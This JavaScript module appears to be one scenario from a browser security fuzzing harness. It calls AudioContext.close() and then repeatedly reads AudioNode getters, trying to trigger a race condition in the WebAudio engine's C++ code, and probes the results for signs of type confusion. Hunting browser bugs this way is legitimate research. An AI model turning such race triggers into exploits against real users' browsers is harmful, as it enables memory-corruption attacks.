/**
 * CENÁRIO: AUDIO_CTX_CLOSE_NODE_ACCESS (Refinado via C++ Analysis)
 * Alvo: AudioNode Getters (No AutoLocker)
 */

export default {
    id:       'AUDIO_CTX_CLOSE_NODE_ACCESS',
    category: 'WebAudio',
    risk:     'HIGH',
    description: 'Race condition entre a destruição do grafo no C++ e o acesso a getters sem AutoLocker no JS.',

    setup: async function() {
        const AC = window.AudioContext || window.webkitAudioContext;
        this.ctx = new AC();
        this.osc = this.ctx.createOscillator();
        this.gain = this.ctx.createGain();
        this.osc.connect(this.gain);
        this.gain.connect(this.ctx.destination);
        this.osc.start();
        this.raceResults = [];
    },

    trigger: async function() {
        // Dispara o close() que roda assincronamente no C++
        const closePromise = this.ctx.close();

        // SPAM DE GETTERS: AudioNode.cpp não usa AutoLocker nestas funções
        // Tentamos ler exatamente enquanto a thread de áudio limpa a memória.
        for (let i = 0; i < 50; i++) {
            try {
                this.raceResults.push({
                    ch: this.osc.channelCount,      // Sem trava no C++
                    inputs: this.osc.numberOfInputs, // Sem trava no C++
                    outputs: this.osc.numberOfOutputs // Sem trava no C++
                });
            } catch(e) {}
        }
        await closePromise;
    },

    probe: [
        s => s.osc.context.state,
        s => s.osc.channelCount,
        s => s.gain.gain.value,
        s => s.raceResults.length,
        // Verifica se algum valor mudou de forma impossível durante o race
        s => s.raceResults.some(r => r.ch === undefined) ? 'TYPE_CONFUSION_DETECTED' : 'ok'
    ],

    cleanup: function() {}
};
